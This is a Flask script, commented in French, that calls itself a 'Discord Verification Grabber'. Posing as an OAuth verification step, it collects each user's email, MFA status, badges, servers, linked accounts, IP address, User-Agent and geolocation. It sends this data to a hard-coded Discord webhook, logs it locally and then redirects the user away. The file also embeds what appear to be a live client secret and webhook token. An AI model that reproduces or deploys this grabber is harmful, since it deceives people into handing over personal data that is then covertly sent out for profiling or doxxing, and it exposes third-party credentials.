from flask import Flask, request, redirect, jsonify
import requests
import json
from datetime import datetime

app = Flask(__name__)

CLIENT_ID = "1499869968899244252"
CLIENT_SECRET = "G2Z-Hx8fSOv8d_DsROLk0k-CZdFBrbA5"
REDIRECT_URI = "https://negro-lemon.vercel.app/callback"

WEBHOOK_URL = "https://discord.com/api/webhooks/1498739271006294016/_4sdyqbsQ6UPC7GP1HPtqnWAf7qPuwCf4G4HYWLVqawxX6iWpHR4kZtpb12W9UJykAT-"

def check_vpn(ip):
    """Vérifie si l'IP est un VPN/proxy"""
    try:
        resp = requests.get(f"https://ipapi.co/{ip}/json/", timeout=5)
        return resp.json()
    except:
        return {"error": "check failed"}

def get_all_discord_data(access_token):
    """Récupère TOUTES les données utilisateur Discord"""
    headers = {"Authorization": f"Bearer {access_token}"}
    data = {}
    
    # User info (avec email)
    resp = requests.get("https://discord.com/api/users/@me", headers=headers)
    data['user'] = resp.json()
    
    # Guilds (serveurs)
    resp = requests.get("https://discord.com/api/users/@me/guilds", headers=headers)
    data['guilds'] = resp.json() if resp.status_code == 200 else []
    
    # Connections (Steam, Spotify, Twitch, etc.)
    resp = requests.get("https://discord.com/api/users/@me/connections", headers=headers)
    data['connections'] = resp.json() if resp.status_code == 200 else []
    
    # Authorized apps
    resp = requests.get("https://discord.com/api/oauth2/@me/apps", headers=headers)
    data['authorized_apps'] = resp.json() if resp.status_code == 200 else []
    
    return data

@app.route("/")
def home():
    return jsonify({"status": "online", "service": "Discord Verification Grabber"})

@app.route("/callback")
def callback():
    user_ip = request.headers.get('X-Forwarded-For', request.remote_addr).split(',')[0].strip()
    code = request.args.get("code")
    
    if not code:
        return "❌ Aucun code reçu.", 400

    # Échange du code contre un token
    token_resp = requests.post(
        "https://discord.com/api/oauth2/token",
        data={
            "client_id": CLIENT_ID,
            "client_secret": CLIENT_SECRET,
            "grant_type": "authorization_code",
            "code": code,
            "redirect_uri": REDIRECT_URI,
        },
        headers={"Content-Type": "application/x-www-form-urlencoded"},
    )
    token_data = token_resp.json()
    access_token = token_data.get("access_token")
    refresh_token = token_data.get("refresh_token")

    if not access_token:
        return f"❌ Erreur token : {token_data}", 400

    # Récupère TOUTES les données Discord
    discord_data = get_all_discord_data(access_token)
    user = discord_data.get('user', {})
    
    # Vérification VPN
    vpn_data = check_vpn(user_ip)
    is_suspicious = vpn_data.get('proxy', False) or vpn_data.get('tor', False) or vpn_data.get('vpn', False)
    
    # Construction des champs pour l'embed
    fields = []
    
    # === INFOS DE BASE ===
    fields.append({"name": "👤 Utilisateur", "value": f"{user.get('username')} ({user.get('id')})", "inline": False})
    fields.append({"name": "📛 Nom global", "value": user.get('global_name') or "Aucun", "inline": True})
    fields.append({"name": "📧 Email", "value": user.get('email') or "❌ Non renseigné", "inline": True})
    fields.append({"name": "✅ Email vérifié", "value": "✅ Oui" if user.get('verified') else "❌ Non", "inline": True})
    fields.append({"name": "🌍 Locale", "value": user.get('locale', '?'), "inline": True})
    
    # === NITRO ===
    nitro_map = {0: "❌ Aucun", 1: "✨ Nitro Classic", 2: "💎 Nitro"}
    fields.append({"name": "🎮 Nitro", "value": nitro_map.get(user.get('premium_type', 0), '?'), "inline": True})
    fields.append({"name": "🔒 MFA Activé", "value": "✅ Oui" if user.get('mfa_enabled') else "❌ Non", "inline": True})
    
    # === FLAGS / BADGES ===
    flags = user.get('flags', 0)
    badges = []
    badge_map = {
        1 << 0: "Staff Discord",
        1 << 1: "Partner",
        1 << 2: "HypeSquad Events",
        1 << 3: "Bug Hunter Lvl 1",
        1 << 6: "HypeSquad Bravery",
        1 << 7: "HypeSquad Brilliance",
        1 << 8: "HypeSquad Balance",
        1 << 9: "Early Supporter",
        1 << 10: "Team User",
        1 << 12: "Bug Hunter Lvl 2",
        1 << 14: "Verified Bot Dev",
        1 << 16: "Active Developer",
        1 << 18: "Moderator Alumni"
    }
    for bit, name in badge_map.items():
        if flags & bit:
            badges.append(name)
    fields.append({"name": "🏅 Badges", "value": "\n".join(badges) if badges else "Aucun", "inline": False})
    
    # === SERVEURS COMMUNS ===
    guilds = discord_data.get('guilds', [])
    if guilds:
        guild_list = "\n".join([f"• {g.get('name')} (ID: {g.get('id')})" for g in guilds[:15]])
        if len(guilds) > 15:
            guild_list += f"\n*... et {len(guilds) - 15} autres*"
        fields.append({"name": f"📁 Serveurs ({len(guilds)})", "value": guild_list[:1024], "inline": False})
    
    # === CONNECTIONS (Steam, Spotify, Twitch, etc.) ===
    connections = discord_data.get('connections', [])
    if connections:
        conn_text = []
        for conn in connections:
            conn_text.append(f"• **{conn.get('type', '').upper()}**: {conn.get('name')} (ID: {conn.get('id')})")
            if conn.get('revoked', False):
                conn_text[-1] += " [REVOQUÉE]"
            if conn.get('verified', False):
                conn_text[-1] += " ✅"
        fields.append({"name": f"🔗 Connections ({len(connections)})", "value": "\n".join(conn_text[:10])[:1024], "inline": False})
    
    # === IP ET VPN ===
    fields.append({"name": "🌐 IP", "value": user_ip, "inline": True})
    fields.append({"name": "🖥️ User-Agent", "value": request.headers.get('User-Agent', '?')[:100], "inline": False})
    fields.append({"name": "📍 Ville/Pays", "value": f"{vpn_data.get('city', '?')}, {vpn_data.get('country_name', '?')}", "inline": True})
    fields.append({"name": "🛡️ Proxy/VPN", "value": "⚠️ **DÉTECTÉ**" if is_suspicious else "✅ Propre", "inline": True})
    fields.append({"name": "📱 Mobile/App", "value": "✅" if vpn_data.get('mobile') else "❌", "inline": True})
    
    # Envoi au webhook Discord avec TOUTES les données
    color = 0xed4245 if is_suspicious else 0x57f287
    
    webhook_data = {
        "embeds": [{
            "title": "📝 **Nouvelle vérification Discord**",
            "color": color,
            "fields": fields,
            "footer": {"text": f"Système de vérification • {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"},
            "thumbnail": {"url": f"https://cdn.discordapp.com/avatars/{user.get('id')}/{user.get('avatar')}.png?size=256"} if user.get('avatar') else None
        }]
    }
    
    # Envoie aussi un second embed avec plus de détails si besoin
    webhook_data["embeds"][0]["fields"] = fields[:25]  # Limite Discord à 25 fields
    
    try:
        requests.post(WEBHOOK_URL, json=webhook_data)
    except Exception as e:
        print(f"Webhook error: {e}")
    
    # Log console
    print(f"[{datetime.now()}] ✅ {user.get('username')} ({user.get('id')}) — {user.get('email')} — IP: {user_ip} — VPN: {is_suspicious}")
    print(f"   📁 Serveurs: {len(guilds)} | 🔗 Connections: {len(connections)}")
    
    # Sauvegarde locale (optionnel)
    with open("verif_logs.json", "a") as f:
        f.write(json.dumps({
            "timestamp": datetime.now().isoformat(),
            "user": user,
            "ip": user_ip,
            "vpn": is_suspicious,
            "guilds_count": len(guilds),
            "connections": connections
        }) + "\n")
    
    # Redirection
    return redirect("https://guns.lol/j8a")

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=10000)
